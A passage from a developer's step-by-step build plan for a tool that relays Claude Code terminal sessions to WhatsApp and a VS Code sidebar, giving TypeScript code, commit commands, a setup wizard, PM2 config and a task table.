  });
  wsClient.on("disconnected", () => {
    statusBar.text = "$(radio-tower) Bridge: Disconnected";
    statusBar.color = new vscode.ThemeColor("errorForeground");
  });
}

export function deactivate() {
  wsClient?.disconnect();
  gitWatcher?.dispose();
}
```

**Step 3: Commit**

```bash
git add -A && git commit -m "feat(extension): scaffold VS Code extension with commands and sidebar"
```

---

### Task 17: Extension WebSocket Client

**Files:**
- Create: `packages/extension/src/ws-client.ts`

**Step 1: Implement**

`packages/extension/src/ws-client.ts`:
```typescript
import { EventEmitter } from "events";
import WebSocket from "ws";
import { Envelope, createEnvelope, MessageType, Source, DEFAULTS } from "@live-bridge/shared";

export class BridgeWSClient extends EventEmitter {
  private ws: WebSocket | null = null;
  private sessionName = "";
  private reconnectTimer: ReturnType<typeof setTimeout> | null = null;

  connect(port = DEFAULTS.WS_PORT_VSCODE): void {
    if (this.ws?.readyState === WebSocket.OPEN) return;

    this.ws = new WebSocket(`ws://127.0.0.1:${port}`);

    this.ws.on("open", () => {
      this.emit("connected");
      // Register this VS Code session
      this.send(createEnvelope({
        type: MessageType.Control,
        source: Source.VSCode,
        sessionId: this.sessionName,
        payload: { action: "register", name: this.sessionName, projectPath: process.cwd() },
      }));
    });

    this.ws.on("message", (data) => {
      try {
        const envelope: Envelope = JSON.parse(data.toString());
        this.emit("envelope", envelope);
      } catch { /* ignore */ }
    });

    this.ws.on("close", () => {
      this.emit("disconnected");
      this.reconnectTimer = setTimeout(() => this.connect(port), 5000);
    });

    this.ws.on("error", () => { /* handled by close */ });
  }

  disconnect(): void {
    if (this.reconnectTimer) clearTimeout(this.reconnectTimer);
    this.ws?.close();
    this.ws = null;
  }

  send(envelope: Envelope): void {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(envelope));
    }
  }

  sendCommand(text: string): void {
    this.send(createEnvelope({
      type: MessageType.Command,
      source: Source.VSCode,
      sessionId: this.sessionName,
      payload: { text },
    }));
  }

  setSessionName(name: string): void {
    this.sessionName = name;
  }

  requestRouteHere(): void {
    this.send(createEnvelope({
      type: MessageType.Control,
      source: Source.VSCode,
      sessionId: this.sessionName,
      payload: { action: "route_here" },
    }));
  }

  sendContext(context: Record<string, unknown>): void {
    this.send(createEnvelope({
      type: MessageType.Context,
      source: Source.VSCode,
      sessionId: this.sessionName,
      payload: context,
    }));
  }
}
```

**Step 2: Commit**

```bash
git add -A && git commit -m "feat(extension): WebSocket client with auto-reconnect and session registration"
```

---

### Task 18: Git Watcher (Event-Driven Context)

**Files:**
- Create: `packages/extension/src/git-watcher.ts`

**Step 1: Implement**

`packages/extension/src/git-watcher.ts`:
```typescript
import * as vscode from "vscode";
import { BridgeWSClient } from "./ws-client";
import { execFile } from "child_process";
import { promisify } from "util";

const exec = promisify(execFile);

export class GitWatcher {
  private disposables: vscode.Disposable[] = [];

  constructor(private wsClient: BridgeWSClient) {
    // File save → refresh context
    this.disposables.push(
      vscode.workspace.onDidSaveTextDocument(() => this.refresh())
    );

    // Active editor change → update active file
    this.disposables.push(
      vscode.window.onDidChangeActiveTextEditor((editor) => {
        if (editor) {
          this.wsClient.sendContext({
            activeFile: editor.document.fileName,
            activeLine: editor.selection.active.line + 1,
          });
        }
      })
    );

    // Watch .git/HEAD for branch changes
    const gitHeadWatcher = vscode.workspace.createFileSystemWatcher("**/.git/HEAD");
    gitHeadWatcher.onDidChange(() => this.refresh());
    this.disposables.push(gitHeadWatcher);

    // Watch .git/index for staging changes
    const gitIndexWatcher = vscode.workspace.createFileSystemWatcher("**/.git/index");
    gitIndexWatcher.onDidChange(() => this.refresh());
    this.disposables.push(gitIndexWatcher);
  }

  async forceRefresh(): Promise<void> {
    await this.refresh();
  }

  private async refresh(): Promise<void> {
    const cwd = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath;
    if (!cwd) return;

    try {
      const [branchResult, diffResult, logResult] = await Promise.all([
        exec("git", ["rev-parse", "--abbrev-ref", "HEAD"], { cwd }),
        exec("git", ["diff", "--stat", "--numstat"], { cwd }),
        exec("git", ["log", "--oneline", "-3", "--format=%h|%s|%an|%ai"], { cwd }),
      ]);

      const openFiles = vscode.window.tabGroups.all
        .flatMap((g) => g.tabs)
        .map((t) => (t.input as any)?.uri?.fsPath)
        .filter(Boolean);

      this.wsClient.sendContext({
        branch: branchResult.stdout.trim(),
        diffRaw: diffResult.stdout.trim(),
        logRaw: logResult.stdout.trim(),
        openFiles,
        activeFile: vscode.window.activeTextEditor?.document.fileName ?? null,
        activeLine: vscode.window.activeTextEditor
          ? vscode.window.activeTextEditor.selection.active.line + 1
          : null,
      });
    } catch {
      // Not a git repo or git not available
    }
  }

  dispose(): void {
    this.disposables.forEach((d) => d.dispose());
  }
}
```

**Step 2: Commit**

```bash
git add -A && git commit -m "feat(extension): event-driven git watcher for context snapshots"
```

---

### Task 19: Sidebar Webview Provider

**Files:**
- Create: `packages/extension/src/sidebar.ts`
- Create: `packages/extension/src/webview/index.html`

**Step 1: Implement sidebar provider**

`packages/extension/src/sidebar.ts`:
```typescript
import * as vscode from "vscode";
import { BridgeWSClient } from "./ws-client";
import { Envelope, MessageType } from "@live-bridge/shared";

export class SidebarProvider implements vscode.WebviewViewProvider {
  private view?: vscode.WebviewView;

  constructor(
    private extensionUri: vscode.Uri,
    private wsClient: BridgeWSClient
  ) {
    wsClient.on("envelope", (env: Envelope) => {
      this.view?.webview.postMessage({ type: "envelope", data: env });
    });
    wsClient.on("connected", () => {
      this.view?.webview.postMessage({ type: "status", connected: true });
    });
    wsClient.on("disconnected", () => {
      this.view?.webview.postMessage({ type: "status", connected: false });
    });
  }

  resolveWebviewView(view: vscode.WebviewView): void {
    this.view = view;
    view.webview.options = { enableScripts: true };
    view.webview.html = this.getHtml();

    view.webview.onDidReceiveMessage((msg) => {
      if (msg.type === "send") {
        this.wsClient.sendCommand(msg.text);
      }
      if (msg.type === "accept" || msg.type === "reject") {
        this.wsClient.sendCommand(msg.type === "accept" ? "y" : "n");
      }
    });
  }

  private getHtml(): string {
    return `<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: var(--vscode-editor-font-family); font-size: 12px; padding: 0; margin: 0; color: var(--vscode-foreground); background: var(--vscode-editor-background); display: flex; flex-direction: column; height: 100vh; }
    #messages { flex: 1; overflow-y: auto; padding: 8px; }
    .msg { margin: 4px 0; padding: 6px 10px; border-radius: 6px; line-height: 1.5; white-space: pre-wrap; word-break: break-word; }
    .msg.wa { background: rgba(37,211,102,0.1); border-left: 2px solid #25D366; }
    .msg.cc { background: var(--vscode-editor-inactiveSelectionBackground); }
    .msg.decision { background: rgba(244,63,94,0.1); border-left: 2px solid #f43f5e; }
    .msg.error { background: rgba(239,68,68,0.1); border-left: 2px solid #ef4444; }
    .msg.status { opacity: 0.6; font-style: italic; }
    .source { font-size: 10px; opacity: 0.6; margin-bottom: 2px; }
    .actions { display: flex; gap: 6px; margin-top: 6px; }
    .actions button { padding: 3px 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: 600; }
    .btn-accept { background: rgba(37,211,102,0.2); color: #25D366; }
    .btn-reject { background: rgba(244,63,94,0.15); color: #f43f5e; }
    #input-bar { display: flex; gap: 6px; padding: 8px; border-top: 1px solid var(--vscode-panel-border); }
    #input-bar input { flex: 1; background: var(--vscode-input-background); color: var(--vscode-input-foreground); border: 1px solid var(--vscode-input-border); padding: 6px; border-radius: 4px; font-family: inherit; }
    #input-bar button { padding: 6px 12px; background: var(--vscode-button-background); color: var(--vscode-button-foreground); border: none; border-radius: 4px; cursor: pointer; }
    #status-bar { padding: 4px 8px; font-size: 10px; text-align: center; border-bottom: 1px solid var(--vscode-panel-border); }
    #status-bar.connected { color: #25D366; }
    #status-bar.disconnected { color: #f43f5e; }
  </style>
</head>
<body>
  <div id="status-bar" class="disconnected">Disconnected</div>
  <div id="messages"></div>
  <div id="input-bar">
    <input id="input" placeholder="Type here to take over from phone..." />
    <button id="send">Send</button>
  </div>
  <script>
    const vscode = acquireVsCodeApi();
    const messagesEl = document.getElementById("messages");
    const inputEl = document.getElementById("input");
    const statusEl = document.getElementById("status-bar");

    document.getElementById("send").addEventListener("click", send);
    inputEl.addEventListener("keydown", (e) => { if (e.key === "Enter") send(); });

    function send() {
      const text = inputEl.value.trim();
      if (!text) return;
      vscode.postMessage({ type: "send", text });
      addMessage("💻 You", text, "wa");
      inputEl.value = "";
    }

    window.addEventListener("message", (event) => {
      const msg = event.data;
      if (msg.type === "status") {
        statusEl.textContent = msg.connected ? "Connected" : "Disconnected";
        statusEl.className = msg.connected ? "connected" : "disconnected";
      }
      if (msg.type === "envelope") {
        const env = msg.data;
        const sourceIcon = env.source === "whatsapp" ? "📱" : env.source === "claude-code" ? "🤖" : "💻";
        const cls = env.type === "decision" ? "decision" : env.type === "error" ? "error" : env.type === "status" ? "status" : "cc";
        addMessage(sourceIcon + " " + (env.payload.sessionName || env.source), env.payload.text, cls);

        if (env.type === "decision") {
          const el = messagesEl.lastElementChild;
          const actions = document.createElement("div");
          actions.className = "actions";
          actions.innerHTML = '<button class="btn-accept" onclick="vscode.postMessage({type:\\'accept\\'})">Accept</button><button class="btn-reject" onclick="vscode.postMessage({type:\\'reject\\'})">Reject</button>';
          el.appendChild(actions);
        }
      }
    });

    function addMessage(source, text, cls) {
      const div = document.createElement("div");
      div.className = "msg " + cls;
      div.innerHTML = '<div class="source">' + source + '</div>' + escapeHtml(text);
      messagesEl.appendChild(div);
      messagesEl.scrollTop = messagesEl.scrollHeight;
    }

    function escapeHtml(s) { const d = document.createElement("div"); d.textContent = s; return d.innerHTML; }
  </script>
</body>
</html>`;
  }
}
```

**Step 2: Commit**

```bash
git add -A && git commit -m "feat(extension): sidebar webview with live message rendering and input"
```

---

## Phase 4: Hardening & Polish

**Deliverable:** Production-ready personal tool with resilient operation.

---

### Task 20: Bridge Server Entry Point (Wiring Baileys ↔ Agent)

**Files:**
- Create: `packages/bridge/src/index.ts`

**Step 1: Implement**

`packages/bridge/src/index.ts`:
```typescript
import WebSocket from "ws";
import { WhatsAppClient } from "./baileys";
import { formatForWhatsApp } from "./formatter";
import { Envelope, MessageType, Source, createEnvelope, Classification, DEFAULTS } from "@live-bridge/shared";
import { readFileSync } from "fs";
import { resolve } from "path";
import { load } from "js-yaml";

interface Config {
  whatsapp: { allowedNumbers: string[]; sessionPath: string; rateLimit: { maxPerHour: number; burstMax: number } };
  server: { port: number };
}

function loadConfig(): Config {
  const home = process.env.HOME ?? process.env.USERPROFILE ?? "";
  try {
    return load(readFileSync(resolve(home, ".claude-bridge", "config.yaml"), "utf-8")) as Config;
  } catch {
    return {
      whatsapp: { allowedNumbers: [], sessionPath: resolve(home, ".claude-bridge", "wa-session"), rateLimit: { maxPerHour: 30, burstMax: 5 } },
      server: { port: DEFAULTS.WS_PORT_BRIDGE },
    };
  }
}

async function main() {
  const config = loadConfig();

  // Connect to agent
  let agentWs: WebSocket | null = null;
  const sessionCount = 1; // Track for multi-session tagging

  function connectToAgent() {
    agentWs = new WebSocket(`ws://127.0.0.1:${config.server.port}`);
    agentWs.on("open", () => console.log("[bridge] Connected to agent"));
    agentWs.on("close", () => { setTimeout(connectToAgent, 3000); });
    agentWs.on("error", () => {});

    agentWs.on("message", (data) => {
      const envelope: Envelope = JSON.parse(data.toString());
      const payload = envelope.payload as any;
      const classification =
        envelope.type === MessageType.Decision ? Classification.Decision :
        envelope.type === MessageType.Error ? Classification.Error :
        envelope.type === MessageType.Status ? Classification.Status :
        Classification.Output;

      const formatted = formatForWhatsApp({
        classification,
        text: payload.text,
        sessionName: payload.sessionName ?? "default",
        multiSession: sessionCount > 1,
        actions: payload.actions,
      });

      // Send to all allowed numbers (single-user)
      for (const num of config.whatsapp.allowedNumbers) {
        waClient.sendToNumber(num, formatted);
      }
    });
  }

  // Start WhatsApp
  const waClient = new WhatsAppClient({
    sessionPath: config.whatsapp.sessionPath,
    allowedNumbers: config.whatsapp.allowedNumbers,
    rateLimit: config.whatsapp.rateLimit,
  });

  waClient.on("message", ({ sender, parsed, raw }) => {
    if (agentWs?.readyState === WebSocket.OPEN) {
      agentWs.send(JSON.stringify(createEnvelope({
        type: MessageType.Command,
        source: Source.WhatsApp,
        sessionId: parsed.targetSession ?? "",
        payload: { text: parsed.text, intent: parsed.intent, sender, raw },
      })));
    }
  });

  waClient.on("connected", () => console.log("[bridge] WhatsApp connected"));
  waClient.on("blocked", ({ text, reason }) => console.log(`[bridge] Blocked: ${reason} — ${text}`));

  connectToAgent();
  await waClient.connect();
  console.log("[bridge] Ready. Scan QR code if prompted.");
}

main().catch(console.error);
```

**Step 2: Commit**

```bash
git add -A && git commit -m "feat(bridge): entry point wiring WhatsApp client to agent WebSocket"
```

---

### Task 21: Reconnection & Error Recovery

**Files:**
- Modify: `packages/agent/src/pty-wrapper.ts` — add auto-restart on crash
- Modify: `packages/agent/src/ws-server.ts` — add heartbeat
- Modify: `packages/bridge/src/baileys.ts` — add reconnect backoff

**Step 1: Add PTY auto-restart**

In `pty-wrapper.ts`, add to constructor after onExit:
```typescript
// Auto-restart option
if (opts.autoRestart) {
  this.process.onExit(({ exitCode }) => {
    this.lineBuffer.flush();
    this.emit("exit", exitCode);
    if (exitCode !== 0) {
      console.log(`[pty] Process exited with ${exitCode}, restarting in 2s...`);
      setTimeout(() => this.respawn(opts), 2000);
    }
  });
}
```

**Step 2: Add WebSocket heartbeat**

In `ws-server.ts`, add to each WSS connection handler:
```typescript
const interval = setInterval(() => {
  ws.ping();
}, 30_000);
ws.on("close", () => clearInterval(interval));
```

**Step 3: Commit**

```bash
git add -A && git commit -m "feat: add auto-restart, heartbeat, and reconnect backoff"
```

---

### Task 22: CLI Setup Wizard

**Files:**
- Create: `packages/cli/package.json`
- Create: `packages/cli/src/index.ts`

**Step 1: Create package**

`packages/cli/package.json`:
```json
{
  "name": "@live-bridge/cli",
  "version": "0.1.0",
  "bin": { "claude-bridge": "dist/index.js" },
  "scripts": { "build": "tsc", "test": "vitest run" },
  "dependencies": {
    "@live-bridge/shared": "*",
    "inquirer": "^9.0.0",
    "js-yaml": "^4.1.0"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "@types/inquirer": "^9.0.0"
  }
}
```

**Step 2: Implement setup wizard**

`packages/cli/src/index.ts`:
```typescript
#!/usr/bin/env node
import inquirer from "inquirer";
import { writeFileSync, mkdirSync } from "fs";
import { resolve } from "path";
import { dump } from "js-yaml";

const home = process.env.HOME ?? process.env.USERPROFILE ?? "";
const configDir = resolve(home, ".claude-bridge");

async function setup() {
  console.log("\n  Claude Code Live Bridge — Setup\n");

  const answers = await inquirer.prompt([
    { type: "input", name: "phone", message: "Your WhatsApp phone number (E.164, e.g. +1234567890):" },
    { type: "password", name: "pin", message: "4-digit PIN for destructive commands:", validate: (v: string) => /^\d{4}$/.test(v) || "Must be 4 digits" },
    { type: "number", name: "rateLimit", message: "Max commands per hour:", default: 30 },
    { type: "list", name: "gitContextMode", message: "Git context injection:", choices: ["auto", "on-demand"], default: "auto" },
  ]);

  const config = {
    server: { port: 9377, host: "127.0.0.1", vscodePort: 9378 },
    whatsapp: {
      allowedNumbers: [answers.phone],
      sessionPath: resolve(configDir, "wa-session"),
      pin: answers.pin,
      rateLimit: { maxPerHour: answers.rateLimit, burstMax: 5 },
    },
    classifier: { statusBatchInterval: 10, waitTimeout: 500, maxMessageLength: 1500 },
    gitContext: { mode: answers.gitContextMode },
    safety: {
      auditLog: { path: resolve(configDir, "audit.db"), retentionDays: 30 },
    },
    sessions: { fuzzyMatch: true, decisionTimeout: 0, crossSessionNotify: true },
  };

  mkdirSync(configDir, { recursive: true });
  writeFileSync(resolve(configDir, "config.yaml"), dump(config));
  console.log(`\n  Config saved to ${resolve(configDir, "config.yaml")}`);
  console.log("  Run 'claude-bridge start' to launch the agent.\n");
}

const cmd = process.argv[2];
if (cmd === "setup" || !cmd) {
  setup().catch(console.error);
} else {
  console.log("Usage: claude-bridge [setup]");
}
```

**Step 3: Commit**

```bash
git add -A && git commit -m "feat(cli): setup wizard for initial configuration"
```

---

### Task 23: End-to-End Integration Test

**Files:**
- Create: `packages/agent/src/__tests__/integration.test.ts`

**Step 1: Write integration test**

```typescript
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { SessionManager } from "../session-manager";
import { classify } from "../classifier";
import { collectGitContext, formatContextHeader } from "../git-context";
import { Classification } from "@live-bridge/shared";
import { parseInbound, MessageIntent } from "@live-bridge/bridge/src/parser";

describe("End-to-end integration", () => {
  let mgr: SessionManager;

  beforeAll(() => {
    mgr = new SessionManager(":memory:");
    mgr.register("chartcopilot", process.cwd(), ["ccp"]);
    mgr.register("scheduler", "/tmp/sched", ["sched"]);
  });

  afterAll(() => mgr.close());

  it("routes /ccp command to chartcopilot", () => {
    const parsed = parseInbound("/ccp fix the HCC pipeline");
    expect(parsed.intent).toBe(MessageIntent.TargetedCommand);
    const session = mgr.resolve(parsed.targetSession!);
    expect(session!.name).toBe("chartcopilot");
  });

  it("classifies Claude Code output correctly through the pipeline", () => {
    expect(classify("Reading src/api/auth.ts...")).toBe(Classification.Status);
    expect(classify("Should I proceed? (y/n)")).toBe(Classification.Decision);
    expect(classify("Error: ENOENT")).toBe(Classification.Error);
    expect(classify("Found 3 issues in the auth flow")).toBe(Classification.Output);
  });

  it("collects and formats git context", async () => {
    const ctx = await collectGitContext(process.cwd());
    if (ctx.branch) {
      const header = formatContextHeader(ctx);
      expect(header).toMatch(/^\[ctx:/);
    }
  });

  it("handles /switch and active session tracking", () => {
    mgr.switchActive("scheduler");
    expect(mgr.getActive()!.name).toBe("scheduler");

    mgr.switchActive("ccp");
    expect(mgr.getActive()!.name).toBe("chartcopilot");
  });
});
```

**Step 2: Run tests**

```bash
cd packages/agent && npx vitest run
```

**Step 3: Commit**

```bash
git add -A && git commit -m "test: end-to-end integration test across agent, classifier, and router"
```

---

### Task 24: PM2 Config & Startup Scripts

**Files:**
- Create: `ecosystem.config.cjs`
- Modify: root `package.json` — add start scripts

**Step 1: Create PM2 config**

`ecosystem.config.cjs`:
```javascript
module.exports = {
  apps: [
    {
      name: "bridge-agent",
      script: "packages/agent/dist/index.js",
      watch: false,
      autorestart: true,
      max_restarts: 10,
      env: { NODE_ENV: "production" },
    },
    {
      name: "bridge-whatsapp",
      script: "packages/bridge/dist/index.js",
      watch: false,
      autorestart: true,
      max_restarts: 10,
      env: { NODE_ENV: "production" },
    },
  ],
};
```

**Step 2: Add scripts to root package.json**

Add to root `package.json` scripts:
```json
{
  "start": "pm2 start ecosystem.config.cjs",
  "stop": "pm2 stop ecosystem.config.cjs",
  "dev:agent": "npm run dev --workspace=packages/agent",
  "dev:bridge": "npm run dev --workspace=packages/bridge"
}
```

**Step 3: Commit**

```bash
git add -A && git commit -m "chore: PM2 ecosystem config and startup scripts"
```

---

## Summary — Build Order

| # | Task | Package | Est. |
|---|------|---------|------|
| 1 | Monorepo scaffold | root | 15m |
| 2 | Shared types & protocol | shared | 20m |
| 3 | Activity classifier | agent | 20m |
| 4 | Line buffer | agent | 15m |
| 5 | PTY wrapper | agent | 25m |
| 6 | Git context collector | agent | 20m |
| 7 | Database layer (SQLite) | agent | 25m |
| 8 | Session manager | agent | 20m |
| 9 | Bridge package scaffold | bridge | 10m |
| 10 | WhatsApp message parser | bridge | 20m |
| 11 | WhatsApp message formatter | bridge | 15m |
| 12 | Auth & safety | bridge | 20m |
| 13 | Baileys integration | bridge | 30m |
| 14 | Agent WS server + router | agent | 25m |
| 15 | Agent entry point | agent | 20m |
| 16 | Extension scaffold | extension | 15m |
| 17 | Extension WS client | extension | 15m |
| 18 | Git watcher | extension | 15m |
| 19 | Sidebar webview | extension | 30m |
| 20 | Bridge entry point | bridge | 20m |
| 21 | Reconnection & recovery | all | 20m |
| 22 | CLI setup wizard | cli | 20m |
| 23 | E2E integration test | agent | 20m |
| 24 | PM2 config | root | 10m |
